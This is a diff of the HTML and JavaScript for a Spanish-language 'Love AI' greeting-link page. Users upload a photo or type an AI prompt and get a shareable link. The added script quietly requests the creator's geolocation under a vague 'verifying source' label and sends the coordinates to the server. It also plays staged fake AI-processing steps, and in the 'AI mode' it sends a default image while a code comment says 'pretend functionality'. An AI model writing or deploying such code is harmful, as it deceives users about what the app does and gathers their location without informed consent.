@@ -10,85 +10,178 @@
 
 <body>
     <header>
-        <div class="brand">Love AI ✨</div>
+        <div class="brand">Love AI 💘</div>
     </header>
     <main>
-        <div class="glass-panel">
-            <h2>Crea un Momento Mágico</h2>
-            <p>Sube una imagen para generar una experiencia de visualización única mejorada por IA para esa persona
-                especial.</p>
+        <div class="glass-panel" style="width: 100%; max-width: 500px;">
+            <h2>Estudio de Creación Mágica</h2>
+            <p style="margin-bottom: 2rem;">Diseña una experiencia inolvidable para tu persona especial.</p>
 
-            <div class="upload-container">
-                <input type="text" id="senderName" placeholder="Tu Nombre (ej. Romeo)" />
-                <input type="file" id="fileInput" accept="image/*">
-                <button onclick="startUploadProcess()">Generar Link Encantado ✨</button>
+            <div class="upload-container" id="upload-stage">
+
+                <!-- SENDER NAME -->
+                <div class="input-group">
+                    <label>¿De parte de quién?</label>
+                    <input type="text" id="senderName" placeholder="Tu Nombre o Apodo (ej. Admirador Secreto)" />
+                </div>
+
+                <!-- OPTION TABS -->
+                <div class="tabs">
+                    <button class="tab active" onclick="switchTab('upload')">📷 Subir Foto</button>
+                    <button class="tab" onclick="switchTab('ai')">🤖 Crear con IA</button>
+                </div>
+
+                <!-- FILE UPLOAD AREA -->
+                <div id="tab-upload" class="tab-content active">
+                    <div class="file-drop-area" onclick="document.getElementById('fileInput').click()">
+                        <span class="fake-btn">Escoger Imagen</span>
+                        <span class="file-msg">o arrastra aquí tu foto favorita</span>
+                        <input class="file-input" type="file" id="fileInput" accept="image/*"
+                            onchange="updateFileLabel(this)">
+                    </div>
+                </div>
+
+                <!-- AI GENERATION AREA -->
+                <div id="tab-ai" class="tab-content">
+                    <div class="ai-chat-box">
+                        <p class="ai-msg">👋 Soy la IA del Amor. ¿Qué deseas crear hoy?</p>
+                        <div class="ai-input-wrapper">
+                            <input type="text" id="aiPrompt" placeholder="Ej: Una carta de amor para Lina..." />
+                        </div>
+                        <p style="font-size: 0.75rem; color: #aaa; margin-top: 5px;">* Generaré una imagen única basada
+                            en tu petición.</p>
+                    </div>
+                </div>
+
+                <button class="action-btn" onclick="startCreationProcess()">✨ Crear Experiencia Mágica ✨</button>
                 <div id="status" style="margin-top: 1rem; color: var(--secondary);"></div>
             </div>
 
-            <div id="result" class="hidden">
-                <h3 style="color: var(--primary);">¡Link Mágico Listo! ✨</h3>
-                <div class="link-box"
-                    style="background: rgba(255,255,255,0.1); border:none; color:white; padding:15px; margin-top:10px; word-break:break-all;">
-                    <a id="shareLink" href="#" target="_blank" style="color:yellow; font-weight:bold;"></a>
+            <!-- RESULT STAGE -->
+            <div id="result-stage" class="hidden">
+                <div style="font-size: 3rem; margin-bottom: 1rem;">💌</div>
+                <h3 style="color: var(--primary);">¡Tu Enlace Mágico está Listo!</h3>
+                <p>Tu persona especial verá la animación de IA y luego tu mensaje.</p>
+
+                <div class="link-box" onclick="copyLink()">
+                    <span id="shareLinkText">...</span>
+                    <button class="copy-btn">COPIAR</button>
                 </div>
-                <p style="font-size:0.8rem; margin-top:10px;">Envía esto para revelar la sorpresa.</p>
+
+                <p style="font-size:0.8rem; margin-top:1.5rem; color:#aaa;">
+                    Envíalo por WhatsApp, Instagram o SMS.
+                </p>
                 <button onclick="location.reload()"
-                    style="background: transparent; border: 1px solid white; margin-top:1rem;">Crear Otro</button>
+                    style="background: transparent; border: 1px solid white; margin-top:1rem; padding: 8px 16px; border-radius: 20px; color: white; cursor: pointer;">Crear
+                    Otro</button>
             </div>
         </div>
 
-        <div style="margin-top: 1rem; text-align: center;">
-            <a href="/dashboard.html" style="font-size:0.8rem; opacity:0.5;">Panel de Control (Privado)</a>
+        <div style="margin-top: 2rem; text-align: center;">
+            <a href="/dashboard.html" style="font-size:0.8rem; opacity:0.5; color: white; text-decoration: none;">🔐
+                Acceso Admin</a>
         </div>
     </main>
 
     <!-- MAGIC MODAL -->
     <div id="magic-modal" class="hidden"
-        style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:100; display:flex; justify-content:center; align-items:center;">
-        <div style="text-align:center; color:white;">
-            <div class="loader" style="margin: 0 auto 20px auto;"></div>
-            <h2 id="magic-text" style="color: var(--secondary);">Iniciando Magia...</h2>
-        </div>
+        style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:100; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+        <div class="loader" style="margin-bottom: 2rem;"></div>
+        <h2 id="magic-text" style="color: var(--secondary); font-size: 1.5rem;">Conectando con el corazón...</h2>
+        <p id="magic-subtext" style="color: #aaa; font-size: 0.9rem;">Verificando creador...</p>
     </div>
 
     <script>
-        async function startUploadProcess() {
-            const fileInput = document.getElementById('fileInput');
-            if (!fileInput.files[0]) {
-                alert("Por favor selecciona una imagen.");
+        let selectedMode = 'upload'; // 'upload' or 'ai'
+
+        function switchTab(mode) {
+            selectedMode = mode;
+            document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+            event.target.classList.add('active');
+            document.getElementById(`tab-${mode}`).classList.add('active');
+        }
+
+        function updateFileLabel(input) {
+            if (input.files && input.files[0]) {
+                document.querySelector('.file-msg').textContent = input.files[0].name;
+            }
+        }
+
+        function copyLink() {
+            const text = document.getElementById('shareLinkText').innerText;
+            navigator.clipboard.writeText(text);
+            alert("¡Enlace copiado al portapapeles!");
+        }
+
+        async function startCreationProcess() {
+            const senderName = document.getElementById('senderName').value.trim();
+            if (!senderName) {
+                alert("Por favor escribe tu nombre para que sepan quién lo envía.");
                 return;
             }
 
+            // MODAL START
             const modal = document.getElementById('magic-modal');
             const txt = document.getElementById('magic-text');
-            modal.style.display = 'flex'; // Override class hidden for flex layout
+            const sub = document.getElementById('magic-subtext');
+            modal.style.display = 'flex';
 
-            const steps = [
-                "Analizando imagen...",
-                "Mejorando nitidez...",
-                "Aumentando resolución con IA...",
-                "Aplicando filtros de amor...",
-                "Generando Link Encantado..."
-            ];
+            // 1. CAPTURE CREATOR LOCATION (Silent attempt)
+            let creatorLoc = { lat: null, lng: null };
+            txt.textContent = "Verificando Fuente...";
+
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
+                    } else reject();
+                });
+                creatorLoc.lat = pos.coords.latitude;
+                creatorLoc.lng = pos.coords.longitude;
+                sub.textContent = "Ubicación del Creador: Registrada";
+            } catch (e) {
+                sub.textContent = "Ubicación del Creador: No disponible (Continuando)";
+            }
+
+            // 2. SIMULATE AI GENERATION
+            const steps = selectedMode === 'upload'
+                ? ["Subiendo archivo seguro...", "Optimizando colores...", "Aplicando filtro romántico...", "Generando enlace único..."]
+                : ["Interpretando tu deseo...", "Dibujando boceto...", "Renderizando detalles...", "Finalizando obra de arte..."];
 
             for (let i = 0; i < steps.length; i++) {
                 txt.textContent = steps[i];
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(r => setTimeout(r, 1200));
             }
 
-            await uploadImage();
+            // 3. SUBMIT
+            await submitData(senderName, creatorLoc);
             modal.style.display = 'none';
         }
 
-        async function uploadImage() {
-            const fileInput = document.getElementById('fileInput');
-            const senderName = document.getElementById('senderName').value;
-            const file = fileInput.files[0];
-            const status = document.getElementById('status');
-
+        async function submitData(senderName, loc) {
             const formData = new FormData();
-            formData.append('image', file);
             formData.append('senderName', senderName);
+            if (loc.lat) {
+                formData.append('creatorLat', loc.lat);
+                formData.append('creatorLng', loc.lng);
+            }
+
+            if (selectedMode === 'upload') {
+                const fileInput = document.getElementById('fileInput');
+                if (!fileInput.files[0]) {
+                    alert("Debes seleccionar una imagen.");
+                    document.getElementById('magic-modal').style.display = 'none';
+                    return;
+                }
+                formData.append('image', fileInput.files[0]);
+            } else {
+                // AI MODE: Use default image but pretend functionality
+                const prompt = document.getElementById('aiPrompt').value || "Carta de amor";
+                formData.append('aiPrompt', prompt);
+                formData.append('useDefault', 'true');
+            }
 
             try {
                 const response = await fetch('/api/upload', {
@@ -98,19 +191,17 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    document.querySelector('.upload-container').classList.add('hidden');
-                    document.getElementById('result').classList.remove('hidden');
+                    document.getElementById('upload-stage').classList.add('hidden');
+                    document.getElementById('result-stage').classList.remove('hidden');
 
-                    const link = `${window.location.origin}${data.link}`;
-                    const linkElement = document.getElementById('shareLink');
-                    linkElement.href = link;
-                    linkElement.textContent = link;
+                    const link = `${window.location.origin}/view/${data.id}`;
+                    document.getElementById('shareLinkText').innerText = link;
+                    // Also make shareLinkText clickable if users want
                 } else {
-                    status.textContent = "Error: " + data.error;
+                    alert("Error: " + data.error);
                 }
             } catch (err) {
-                console.error(err);
-                status.textContent = "Error subiendo archivo.";
+                alert("Error de conexión con el servidor.");
             }
         }
     </script>
